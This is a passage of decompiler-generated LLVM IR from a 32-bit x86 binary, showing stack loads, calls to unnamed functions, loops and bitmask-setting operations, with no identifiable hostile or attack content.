  %v1_8048a91 = add i32 %v0_8048a90, 68
  %v2_8048a91 = inttoptr i32 %v1_8048a91 to i32*
  %v3_8048a91 = load i32, i32* %v2_8048a91, align 4
  store i32 %v3_8048a91, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a91, i32* %v1_8048a90, align 4
  %v2_8048a96 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048a96, i32* %eax.global-to-local, align 4
  %v0_8048a9b = load i32, i32* @esp, align 4
  %v1_8048a9e = add i32 %v0_8048a9b, 10388
  %v1_8048aa5 = load i32, i32* @ebx, align 4
  %v2_8048aa5 = add i32 %v1_8048a9e, %v1_8048aa5
  %v12_8048aa5 = icmp eq i32 %v2_8048aa5, 0
  store i1 %v12_8048aa5, i1* %zf.global-to-local, align 1
  store i32 %v2_8048aa5, i32* %edx.global-to-local, align 4
  %v2_8048aa7 = add i32 %v0_8048a9b, 8
  %v3_8048aa7 = inttoptr i32 %v2_8048aa7 to i32*
  store i32 %v2_8048aa5, i32* %v3_8048aa7, align 4
  %v1_8048aa8 = add i32 %v0_8048a9b, 4
  %v2_8048aa8 = inttoptr i32 %v1_8048aa8 to i32*
  store i32 10, i32* %v2_8048aa8, align 4
  %v3_8048aaa = inttoptr i32 %v0_8048a9b to i32*
  store i32 %v2_8048a96, i32* %v3_8048aaa, align 4
  %v4_8048aab = call i32 @function_80518f0(i64 %v3_8048aab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048aab, i32* %eax.global-to-local, align 4
  %v0_8048ab0 = load i32, i32* @esp, align 4
  %v1_8048ab0 = inttoptr i32 %v0_8048ab0 to i32*
  %v2_8048ab0 = load i32, i32* %v1_8048ab0, align 4
  store i32 %v2_8048ab0, i32* @ebx, align 4
  %v1_8048ab1 = add i32 %v0_8048ab0, 10388
  store i32 %v1_8048ab1, i32* %eax.global-to-local, align 4
  store i32 %v1_8048ab1, i32* %v1_8048ab0, align 4
  %v2_8048ab9 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048ab9, i32* %eax.global-to-local, align 4
  %v0_8048abe = load i32, i32* @esp, align 4
  %v1_8048abe = inttoptr i32 %v0_8048abe to i32*
  %v2_8048abe = load i32, i32* %v1_8048abe, align 4
  store i32 %v2_8048abe, i32* %edx.global-to-local, align 4
  %v3_8048abe = add i32 %v0_8048abe, 4
  %v1_8048abf = inttoptr i32 %v3_8048abe to i32*
  %v2_8048abf = load i32, i32* %v1_8048abf, align 4
  store i32 %v2_8048abf, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v1_8048abf, align 4
  %v1_8048ac5 = add i32 %v0_8048abe, 10388
  store i32 %v1_8048ac5, i32* %edx.global-to-local, align 4
  %v2_8048acc = add i32 %v1_8048ac5, %v2_8048ab9
  store i32 %v2_8048acc, i32* %eax.global-to-local, align 4
  store i32 %v2_8048acc, i32* %v1_8048abe, align 4
  %v3_8048ad0 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048ad0, i32* %eax.global-to-local, align 4
  %v0_8048ad5 = load i32, i32* @esp, align 4
  %v1_8048ad5 = add i32 %v0_8048ad5, 16
  %v6_8048ad5 = icmp eq i32 %v1_8048ad5, 0
  store i1 %v6_8048ad5, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ad8

dec_label_pc_8048ad8:                             ; preds = %dec_label_pc_8048700, %dec_label_pc_80489c4
  %v0_8048ae3 = phi i32 [ %v1_80489b5, %dec_label_pc_8048700 ], [ %v1_8048ad5, %dec_label_pc_80489c4 ]
  %v0_8048ad8 = load i32, i32* @esi, align 4
  %v1_8048ad8 = add i32 %v0_8048ad8, 28
  %v2_8048ad8 = inttoptr i32 %v1_8048ad8 to i32*
  %v3_8048ad8 = load i32, i32* %v2_8048ad8, align 4
  store i32 %v3_8048ad8, i32* @ebx, align 4
  %v1_8048adb = icmp eq i32 %v3_8048ad8, 0
  store i1 %v1_8048adb, i1* %zf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v3_8048ad8, 1
  br i1 %tmp140, label %dec_label_pc_8048bb4, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048ad8
  %v9_8048ae3 = icmp eq i32 %v0_8048ae3, 12
  store i1 %v9_8048ae3, i1* %zf.global-to-local, align 1
  %v1_8048ae6 = add i32 %v0_8048ae3, 10372
  store i32 %v1_8048ae6, i32* %ecx.global-to-local, align 4
  %v2_8048aed = add i32 %v0_8048ae3, -16
  %v3_8048aed = inttoptr i32 %v2_8048aed to i32*
  store i32 %v1_8048ae6, i32* %v3_8048aed, align 4
  %v2_8048aee = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048aee, i32* %eax.global-to-local, align 4
  %v0_8048af3 = load i32, i32* @esp, align 4
  %v1_8048af3 = inttoptr i32 %v0_8048af3 to i32*
  %v2_8048af3 = load i32, i32* %v1_8048af3, align 4
  store i32 %v2_8048af3, i32* %edx.global-to-local, align 4
  %v3_8048af3 = add i32 %v0_8048af3, 4
  %v1_8048af4 = inttoptr i32 %v3_8048af3 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  store i32 %v2_8048af4, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054398.11 to i32), i32* %v1_8048af4, align 4
  %v1_8048afa = add i32 %v0_8048af3, 10388
  store i32 %v1_8048afa, i32* %edx.global-to-local, align 4
  %v2_8048b01 = add i32 %v1_8048afa, %v2_8048aee
  store i32 %v2_8048b01, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b01, i32* %v1_8048af3, align 4
  %v3_8048b05 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b05, i32* %eax.global-to-local, align 4
  %v0_8048b0a = load i32, i32* @esp, align 4
  %v1_8048b0a = add i32 %v0_8048b0a, 20916
  %v2_8048b0a = inttoptr i32 %v1_8048b0a to i32*
  store i32 0, i32* %v2_8048b0a, align 4
  %v0_8048b15 = load i32, i32* @esp, align 4
  %v1_8048b15 = add i32 %v0_8048b15, 16
  %v0_8048b18 = load i32, i32* @esi, align 4
  %v1_8048b18 = add i32 %v0_8048b18, 28
  %v2_8048b18 = inttoptr i32 %v1_8048b18 to i32*
  %v3_8048b18 = load i32, i32* %v2_8048b18, align 4
  store i32 %v3_8048b18, i32* %ebx.global-to-local, align 4
  %v1_8048b1b = icmp eq i32 %v3_8048b18, 0
  store i1 %v1_8048b1b, i1* %zf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v3_8048b18, 1
  br i1 %tmp141, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ae3
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8048b21

dec_label_pc_8048b21:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048b1f
  %v0_8048b24 = phi i32 [ %v1_8048b82, %dec_label_pc_8048b21 ], [ %v1_8048b15, %dec_label_pc_8048b1f ]
  %v0_8048b21 = phi i32 [ %v4_8048b85, %dec_label_pc_8048b21 ], [ 0, %dec_label_pc_8048b1f ]
  %v2_8048b21 = mul i32 %v0_8048b21, 128
  store i32 %v2_8048b21, i32* @ebx, align 4
  %v9_8048b24 = icmp eq i32 %v0_8048b24, 12
  store i1 %v9_8048b24, i1* %zf.global-to-local, align 1
  %v1_8048b27 = add i32 %v0_8048b24, 10372
  store i32 %v1_8048b27, i32* %ecx.global-to-local, align 4
  %v2_8048b2e = add i32 %v0_8048b24, -16
  %v3_8048b2e = inttoptr i32 %v2_8048b2e to i32*
  store i32 %v1_8048b27, i32* %v3_8048b2e, align 4
  %v2_8048b2f = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esp, align 4
  %v1_8048b34 = inttoptr i32 %v0_8048b34 to i32*
  %v3_8048b34 = add i32 %v0_8048b34, 4
  %v0_8048b35 = load i32, i32* @ebx, align 4
  %v1_8048b35 = load i32, i32* @edi, align 4
  %v2_8048b35 = add i32 %v0_8048b35, 1472
  %v3_8048b35 = add i32 %v2_8048b35, %v1_8048b35
  store i32 %v3_8048b35, i32* %edx.global-to-local, align 4
  %v1_8048b3c = inttoptr i32 %v3_8048b34 to i32*
  %v2_8048b3c = load i32, i32* %v1_8048b3c, align 4
  store i32 %v2_8048b3c, i32* %ecx.global-to-local, align 4
  store i32 %v3_8048b35, i32* %v1_8048b3c, align 4
  %v1_8048b3e = add i32 %v0_8048b34, 10388
  store i32 %v1_8048b3e, i32* %edx.global-to-local, align 4
  %v2_8048b45 = add i32 %v1_8048b3e, %v2_8048b2f
  store i32 %v2_8048b45, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b45, i32* %v1_8048b34, align 4
  %v3_8048b49 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b49, i32* %eax.global-to-local, align 4
  %v0_8048b4e = load i32, i32* @esp, align 4
  %v1_8048b4e = inttoptr i32 %v0_8048b4e to i32*
  %v2_8048b4e = load i32, i32* %v1_8048b4e, align 4
  store i32 %v2_8048b4e, i32* @ebx, align 4
  %v1_8048b4f = add i32 %v0_8048b4e, 10388
  store i32 %v1_8048b4f, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048b4f, i32* %v1_8048b4e, align 4
  %v2_8048b57 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048b57, i32* %eax.global-to-local, align 4
  %v0_8048b5c = load i32, i32* @esp, align 4
  %v1_8048b5c = inttoptr i32 %v0_8048b5c to i32*
  %v2_8048b5c = load i32, i32* %v1_8048b5c, align 4
  store i32 %v2_8048b5c, i32* %edx.global-to-local, align 4
  %v3_8048b5c = add i32 %v0_8048b5c, 4
  %v1_8048b5d = inttoptr i32 %v3_8048b5c to i32*
  %v2_8048b5d = load i32, i32* %v1_8048b5d, align 4
  store i32 %v2_8048b5d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80543a1.12 to i32), i32* %v1_8048b5d, align 4
  %v1_8048b63 = add i32 %v0_8048b5c, 10388
  store i32 %v1_8048b63, i32* %edx.global-to-local, align 4
  %v2_8048b6a = add i32 %v1_8048b63, %v2_8048b57
  store i32 %v2_8048b6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b6a, i32* %v1_8048b5c, align 4
  %v3_8048b6e = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b6e, i32* %eax.global-to-local, align 4
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v1_8048b73 = add i32 %v0_8048b73, 20916
  %v2_8048b73 = inttoptr i32 %v1_8048b73 to i32*
  %v3_8048b73 = load i32, i32* %v2_8048b73, align 4
  %v1_8048b7a = add i32 %v3_8048b73, 1
  store i32 %v1_8048b7a, i32* %ebx.global-to-local, align 4
  store i32 %v1_8048b7a, i32* %v2_8048b73, align 4
  %v0_8048b82 = load i32, i32* @esp, align 4
  %v1_8048b82 = add i32 %v0_8048b82, 16
  %v0_8048b85 = load i32, i32* @esi, align 4
  %v1_8048b85 = add i32 %v0_8048b85, 28
  %v2_8048b85 = inttoptr i32 %v1_8048b85 to i32*
  %v3_8048b85 = load i32, i32* %v2_8048b85, align 4
  %v4_8048b85 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8048b85 = sub i32 %v3_8048b85, %v4_8048b85
  %v11_8048b85 = xor i32 %v4_8048b85, %v3_8048b85
  %v12_8048b85 = xor i32 %v5_8048b85, %v3_8048b85
  %v13_8048b85 = and i32 %v12_8048b85, %v11_8048b85
  %v14_8048b85 = icmp slt i32 %v13_8048b85, 0
  %v15_8048b85 = icmp eq i32 %v5_8048b85, 0
  store i1 %v15_8048b85, i1* %zf.global-to-local, align 1
  %v16_8048b85 = icmp slt i32 %v5_8048b85, 0
  %v3_8048b88 = icmp eq i1 %v16_8048b85, %v14_8048b85
  %v4_8048b88 = icmp eq i1 %v15_8048b85, false
  %v5_8048b88 = and i1 %v4_8048b88, %v3_8048b88
  br i1 %v5_8048b88, label %dec_label_pc_8048b21, label %dec_label_pc_8048b8a

dec_label_pc_8048b8a:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048ae3
  %v0_8048b8a = phi i32 [ %v1_8048b15, %dec_label_pc_8048ae3 ], [ %v1_8048b82, %dec_label_pc_8048b21 ]
  %v9_8048b8a = icmp eq i32 %v0_8048b8a, 12
  store i1 %v9_8048b8a, i1* %zf.global-to-local, align 1
  %v1_8048b8d = add i32 %v0_8048b8a, 10372
  store i32 %v1_8048b8d, i32* %ecx.global-to-local, align 4
  %v2_8048b94 = add i32 %v0_8048b8a, -16
  %v3_8048b94 = inttoptr i32 %v2_8048b94 to i32*
  store i32 %v1_8048b8d, i32* %v3_8048b94, align 4
  %v2_8048b95 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048b95, i32* %eax.global-to-local, align 4
  %v0_8048b9a = load i32, i32* @esp, align 4
  %v1_8048b9a = inttoptr i32 %v0_8048b9a to i32*
  %v2_8048b9a = load i32, i32* %v1_8048b9a, align 4
  store i32 %v2_8048b9a, i32* @ebx, align 4
  %v3_8048b9a = add i32 %v0_8048b9a, 4
  %v1_8048b9b = inttoptr i32 %v3_8048b9a to i32*
  %v2_8048b9b = load i32, i32* %v1_8048b9b, align 4
  store i32 %v2_8048b9b, i32* %edi.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v1_8048b9b, align 4
  %v1_8048ba1 = add i32 %v0_8048b9a, 10388
  store i32 %v1_8048ba1, i32* %edx.global-to-local, align 4
  %v2_8048ba8 = add i32 %v1_8048ba1, %v2_8048b95
  store i32 %v2_8048ba8, i32* %eax.global-to-local, align 4
  store i32 %v2_8048ba8, i32* %v1_8048b9a, align 4
  %v3_8048bac = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bac, i32* %eax.global-to-local, align 4
  %v0_8048bb1 = load i32, i32* @esp, align 4
  %v1_8048bb1 = add i32 %v0_8048bb1, 16
  %v6_8048bb1 = icmp eq i32 %v1_8048bb1, 0
  store i1 %v6_8048bb1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ad8, %dec_label_pc_8048b8a
  %v0_8048bb4 = phi i32 [ %v0_8048ae3, %dec_label_pc_8048ad8 ], [ %v1_8048bb1, %dec_label_pc_8048b8a ]
  %v9_8048bb4 = icmp eq i32 %v0_8048bb4, 12
  store i1 %v9_8048bb4, i1* %zf.global-to-local, align 1
  %v1_8048bb7 = add i32 %v0_8048bb4, 10372
  store i32 %v1_8048bb7, i32* %ecx.global-to-local, align 4
  %v2_8048bbe = add i32 %v0_8048bb4, -16
  %v3_8048bbe = inttoptr i32 %v2_8048bbe to i32*
  store i32 %v1_8048bb7, i32* %v3_8048bbe, align 4
  %v2_8048bbf = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048bbf, i32* %eax.global-to-local, align 4
  %v0_8048bc4 = load i32, i32* @esp, align 4
  %v1_8048bc4 = inttoptr i32 %v0_8048bc4 to i32*
  %v2_8048bc4 = load i32, i32* %v1_8048bc4, align 4
  store i32 %v2_8048bc4, i32* %edx.global-to-local, align 4
  %v3_8048bc4 = add i32 %v0_8048bc4, 4
  %v1_8048bc5 = inttoptr i32 %v3_8048bc4 to i32*
  %v2_8048bc5 = load i32, i32* %v1_8048bc5, align 4
  store i32 %v2_8048bc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v1_8048bc5, align 4
  %v1_8048bcb = add i32 %v0_8048bc4, 10388
  store i32 %v1_8048bcb, i32* %edx.global-to-local, align 4
  %v2_8048bd2 = add i32 %v1_8048bcb, %v2_8048bbf
  store i32 %v2_8048bd2, i32* %eax.global-to-local, align 4
  store i32 %v2_8048bd2, i32* %v1_8048bc4, align 4
  %v3_8048bd6 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bd6, i32* %eax.global-to-local, align 4
  %v0_8048bdb = load i32, i32* @esp, align 4
  %v1_8048bdb = add i32 %v0_8048bdb, 16
  %v1_8048bde = add i32 %v0_8048bdb, 68
  %v2_8048bde = inttoptr i32 %v1_8048bde to i32*
  %v3_8048bde = load i32, i32* %v2_8048bde, align 4
  store i32 %v3_8048bde, i32* @edi, align 4
  %v1_8048be2 = icmp eq i32 %v3_8048bde, 0
  store i1 %v1_8048be2, i1* %zf.global-to-local, align 1
  br i1 %v1_8048be2, label %dec_label_pc_8048c10, label %dec_label_pc_8048be6

dec_label_pc_8048be6:                             ; preds = %dec_label_pc_8048bb4
  %v9_8048be6 = icmp eq i32 %v0_8048bdb, -4
  store i1 %v9_8048be6, i1* %zf.global-to-local, align 1
  %v1_8048be9 = add i32 %v0_8048bdb, 10388
  store i32 %v1_8048be9, i32* %ecx.global-to-local, align 4
  %v3_8048bf0 = inttoptr i32 %v0_8048bdb to i32*
  store i32 %v1_8048be9, i32* %v3_8048bf0, align 4
  %v2_8048bf1 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048bf1, i32* %eax.global-to-local, align 4
  %v0_8048bf6 = load i32, i32* @esp, align 4
  %v1_8048bf6 = inttoptr i32 %v0_8048bf6 to i32*
  %v2_8048bf6 = load i32, i32* %v1_8048bf6, align 4
  store i32 %v2_8048bf6, i32* %ecx.global-to-local, align 4
  %v3_8048bf6 = add i32 %v0_8048bf6, 4
  %v1_8048bf7 = inttoptr i32 %v3_8048bf6 to i32*
  %v2_8048bf7 = load i32, i32* %v1_8048bf7, align 4
  store i32 %v2_8048bf7, i32* @ebx, align 4
  %v1_8048bf8 = add i32 %v0_8048bf6, 68
  %v2_8048bf8 = inttoptr i32 %v1_8048bf8 to i32*
  %v3_8048bf8 = load i32, i32* %v2_8048bf8, align 4
  store i32 %v3_8048bf8, i32* %v1_8048bf7, align 4
  %v1_8048bfd = add i32 %v0_8048bf6, 10388
  store i32 %v1_8048bfd, i32* %edx.global-to-local, align 4
  %v2_8048c04 = add i32 %v1_8048bfd, %v2_8048bf1
  store i32 %v2_8048c04, i32* %eax.global-to-local, align 4
  store i32 %v2_8048c04, i32* %v1_8048bf6, align 4
  %v3_8048c08 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048c08, i32* %eax.global-to-local, align 4
  %v0_8048c0d = load i32, i32* @esp, align 4
  %v1_8048c0d = add i32 %v0_8048c0d, 16
  %v6_8048c0d = icmp eq i32 %v1_8048c0d, 0
  store i1 %v6_8048c0d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c10

dec_label_pc_8048c10:                             ; preds = %dec_label_pc_8048bb4, %dec_label_pc_8048be6
  %v1_8048c10 = phi i32 [ %v1_8048bdb, %dec_label_pc_8048bb4 ], [ %v1_8048c0d, %dec_label_pc_8048be6 ]
  %v0_8048c10 = phi i32 [ %v3_8048bd6, %dec_label_pc_8048bb4 ], [ %v3_8048c08, %dec_label_pc_8048be6 ]
  %v2_8048c10 = add i32 %v1_8048c10, -4
  %v3_8048c10 = inttoptr i32 %v2_8048c10 to i32*
  store i32 %v0_8048c10, i32* %v3_8048c10, align 4
  %v0_8048c11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048c11 = add i32 %v1_8048c10, -8
  %v3_8048c11 = inttoptr i32 %v2_8048c11 to i32*
  store i32 %v0_8048c11, i32* %v3_8048c11, align 4
  %v0_8048c12 = load i32, i32* @esi, align 4
  %v2_8048c12 = add i32 %v1_8048c10, -12
  %v3_8048c12 = inttoptr i32 %v2_8048c12 to i32*
  store i32 %v0_8048c12, i32* %v3_8048c12, align 4
  %v1_8048c13 = add i32 %v1_8048c10, 96
  %v2_8048c13 = inttoptr i32 %v1_8048c13 to i32*
  %v3_8048c13 = load i32, i32* %v2_8048c13, align 4
  store i32 %v3_8048c13, i32* %eax.global-to-local, align 4
  %v2_8048c17 = add i32 %v1_8048c10, -16
  %v3_8048c17 = inttoptr i32 %v2_8048c17 to i32*
  store i32 %v3_8048c13, i32* %v3_8048c17, align 4
  %v0_8048c18 = call i32 @function_8051850()
  store i32 %v0_8048c18, i32* %eax.global-to-local, align 4
  %v0_8048c1d = load i32, i32* @esp, align 4
  %v1_8048c1d = add i32 %v0_8048c1d, 16
  %v3_8048c20 = trunc i32 %v0_8048c18 to i8
  %v4_8048c20 = icmp eq i8 %v3_8048c20, 0
  store i1 %v4_8048c20, i1* %zf.global-to-local, align 1
  br i1 %v4_8048c20, label %dec_label_pc_804979e, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c10, %dec_label_pc_804979e
  %v0_8048c28 = phi i32 [ %v1_8048c1d, %dec_label_pc_8048c10 ], [ %v1_80497ab, %dec_label_pc_804979e ]
  %v9_8048c28 = icmp eq i32 %v0_8048c28, 12
  store i1 %v9_8048c28, i1* %zf.global-to-local, align 1
  %v1_8048c2b = add i32 %v0_8048c28, 10372
  store i32 %v1_8048c2b, i32* %ecx.global-to-local, align 4
  %v2_8048c32 = add i32 %v0_8048c28, -16
  %v3_8048c32 = inttoptr i32 %v2_8048c32 to i32*
  store i32 %v1_8048c2b, i32* %v3_8048c32, align 4
  %v2_8048c33 = call i32 @function_80514e0(i8* %v1_8048752)
  %v0_8048c38 = load i32, i32* @esp, align 4
  %v1_8048c38 = add i32 %v0_8048c38, -4
  %v2_8048c38 = inttoptr i32 %v1_8048c38 to i32*
  store i32 16384, i32* %v2_8048c38, align 4
  %v2_8048c3d = add i32 %v0_8048c38, -8
  %v3_8048c3d = inttoptr i32 %v2_8048c3d to i32*
  store i32 %v2_8048c33, i32* %v3_8048c3d, align 4
  %v1_8048c3e = add i32 %v0_8048c38, 10388
  store i32 %v1_8048c3e, i32* %eax.global-to-local, align 4
  %v2_8048c45 = add i32 %v0_8048c38, -12
  %v3_8048c45 = inttoptr i32 %v2_8048c45 to i32*
  store i32 %v1_8048c3e, i32* %v3_8048c45, align 4
  %v0_8048c46 = load i32, i32* @esi, align 4
  %v1_8048c46 = add i32 %v0_8048c46, -1440
  %v2_8048c46 = inttoptr i32 %v1_8048c46 to i32*
  %v3_8048c46 = load i32, i32* %v2_8048c46, align 4
  store i32 %v3_8048c46, i32* %ecx.global-to-local, align 4
  %v2_8048c4c = add i32 %v0_8048c38, -16
  %v3_8048c4c = inttoptr i32 %v2_8048c4c to i32*
  store i32 %v3_8048c46, i32* %v3_8048c4c, align 4
  %v0_8048c4d = call i32 @function_80521c4()
  store i32 %v0_8048c4d, i32* %eax.global-to-local, align 4
  %v0_8048c52 = load i32, i32* @esp, align 4
  %v1_8048c52 = add i32 %v0_8048c52, 112
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  %v3_8048c52 = load i32, i32* %v2_8048c52, align 4
  store i32 %v3_8048c52, i32* %edx.global-to-local, align 4
  %v0_8048c56 = load i32, i32* @esi, align 4
  %v1_8048c56 = add i32 %v0_8048c56, -1440
  %v2_8048c56 = inttoptr i32 %v1_8048c56 to i32*
  %v3_8048c56 = load i32, i32* %v2_8048c56, align 4
  store i32 %v3_8048c56, i32* %eax.global-to-local, align 4
  %v2_8048c5c = add i32 %v0_8048c56, -1428
  %v3_8048c5c = inttoptr i32 %v2_8048c5c to i32*
  store i32 %v3_8048c52, i32* %v3_8048c5c, align 4
  %v0_8048c62 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048c62, i32* %edx.global-to-local, align 4
  %v0_8048c64 = load i32, i32* @esi, align 4
  %v1_8048c64 = add i32 %v0_8048c64, -1436
  %v2_8048c64 = inttoptr i32 %v1_8048c64 to i8*
  store i8 6, i8* %v2_8048c64, align 1
  %v0_8048c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8048c6b = urem i32 %v0_8048c6b, 32
  store i32 %v1_8048c6b, i32* %eax.global-to-local, align 4
  %v0_8048c6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8048c6e = udiv i32 %v0_8048c6e, 32
  store i32 %v2_8048c6e, i32* %edx.global-to-local, align 4
  %v0_8048c71 = load i32, i32* @esp, align 4
  %v2_8048c71 = mul nuw nsw i32 %v2_8048c6e, 4
  %v3_8048c71 = add nuw nsw i32 %v2_8048c71, 20772
  %v4_8048c71 = add i32 %v3_8048c71, %v0_8048c71
  %v5_8048c71 = inttoptr i32 %v4_8048c71 to i32*
  %v6_8048c71 = load i32, i32* %v5_8048c71, align 4
  %v9_8048c71 = shl i32 1, %v1_8048c6b
  %v12_8048c71 = or i32 %v6_8048c71, %v9_8048c71
  %v16_8048c71 = add i32 %v0_8048c71, 20772
  %v17_8048c71 = add i32 %v16_8048c71, %v2_8048c71
  %v18_8048c71 = inttoptr i32 %v17_8048c71 to i32*
  store i32 %v12_8048c71, i32* %v18_8048c71, align 4
  %v0_8048c79 = load i32, i32* @esp, align 4
  %v1_8048c79 = add i32 %v0_8048c79, 32
  %v0_8048c7c = load i32, i32* @esi, align 4
  %v1_8048c7c = add i32 %v0_8048c7c, -1440
  %v2_8048c7c = inttoptr i32 %v1_8048c7c to i32*
  %v3_8048c7c = load i32, i32* %v2_8048c7c, align 4
  store i32 %v3_8048c7c, i32* %eax.global-to-local, align 4
  %v1_8048c82 = add i32 %v0_8048c79, 104
  %v2_8048c82 = inttoptr i32 %v1_8048c82 to i32*
  %v3_8048c82 = load i32, i32* %v2_8048c82, align 4
  %v5_8048c82 = sub i32 %v3_8048c82, %v3_8048c7c
  %v11_8048c82 = xor i32 %v3_8048c82, %v3_8048c7c
  %v12_8048c82 = xor i32 %v5_8048c82, %v3_8048c82
  %v13_8048c82 = and i32 %v12_8048c82, %v11_8048c82
  %v14_8048c82 = icmp slt i32 %v13_8048c82, 0
  %v15_8048c82 = icmp eq i32 %v5_8048c82, 0
  store i1 %v15_8048c82, i1* %zf.global-to-local, align 1
  %v16_8048c82 = icmp slt i32 %v5_8048c82, 0
  %v2_8048c86 = icmp eq i1 %v16_8048c82, %v14_8048c82
  br i1 %v2_8048c86, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_80486ee
  store i8 0, i8* %v2_80485a5, align 1
  br label %dec_label_pc_80485be

dec_label_pc_8048c9d:                             ; preds = %dec_label_pc_8048537
  %v0_8048c9d = load i32, i32* @esp, align 4
  %v1_8048c9d = add i32 %v0_8048c9d, 80
  %v2_8048c9d = inttoptr i32 %v1_8048c9d to i32*
  %v3_8048c9d = load i32, i32* %v2_8048c9d, align 4
  store i32 %v3_8048c9d, i32* %eax.global-to-local, align 4
  %v1_8048ca1 = add i32 %v0_80485a5, -1432
  %v2_8048ca1 = inttoptr i32 %v1_8048ca1 to i32*
  %v3_8048ca1 = load i32, i32* %v2_8048ca1, align 4
  store i32 %v3_8048ca1, i32* @ebx, align 4
  %v2_8048ca7 = sub i32 %v3_8048c9d, %v3_8048ca1
  store i32 %v2_8048ca7, i32* %eax.global-to-local, align 4
  %v9_8048ca9 = icmp eq i32 %v2_8048ca7, 30
  store i1 %v9_8048ca9, i1* %zf.global-to-local, align 1
  %tmp240 = icmp ult i32 %v2_8048ca7, 31
  br i1 %tmp240, label %dec_label_pc_8048cb2, label %dec_label_pc_804855f

dec_label_pc_8048cb2:                             ; preds = %dec_label_pc_8048c9d
  %v1_8048cb2 = add i32 %v0_80485a5, -1440
  %v2_8048cb2 = inttoptr i32 %v1_8048cb2 to i32*
  %v3_8048cb2 = load i32, i32* %v2_8048cb2, align 4
  %v1_8048cba = urem i32 %v3_8048cb2, 32
  store i32 %v1_8048cba, i32* %eax.global-to-local, align 4
  %v2_8048cbd = udiv i32 %v3_8048cb2, 32
  store i32 %v2_8048cbd, i32* %edx.global-to-local, align 4
  %v2_8048cc0 = mul nuw nsw i32 %v2_8048cbd, 4
  %v3_8048cc0 = add i32 %v0_8048c9d, 20612
  %v4_8048cc0 = add i32 %v3_8048cc0, %v2_8048cc0
  %v5_8048cc0 = inttoptr i32 %v4_8048cc0 to i32*
  %v6_8048cc0 = load i32, i32* %v5_8048cc0, align 4
  %v9_8048cc0 = shl i32 1, %v1_8048cba
  %v12_8048cc0 = or i32 %v6_8048cc0, %v9_8048cc0
  store i32 %v12_8048cc0, i32* %v5_8048cc0, align 4
  %v0_8048cc8 = load i32, i32* @esi, align 4
  %v1_8048cc8 = add i32 %v0_8048cc8, -1440
  %v2_8048cc8 = inttoptr i32 %v1_8048cc8 to i32*
  %v3_8048cc8 = load i32, i32* %v2_8048cc8, align 4
  store i32 %v3_8048cc8, i32* %eax.global-to-local, align 4
  %v0_8048cce = load i32, i32* @esp, align 4
  %v1_8048cce = add i32 %v0_8048cce, 72
  %v2_8048cce = inttoptr i32 %v1_8048cce to i32*
  %v3_8048cce = load i32, i32* %v2_8048cce, align 4
  %v5_8048cce = sub i32 %v3_8048cce, %v3_8048cc8
  %v11_8048cce = xor i32 %v3_8048cce, %v3_8048cc8
  %v12_8048cce = xor i32 %v5_8048cce, %v3_8048cce
  %v13_8048cce = and i32 %v12_8048cce, %v11_8048cce
  %v14_8048cce = icmp slt i32 %v13_8048cce, 0
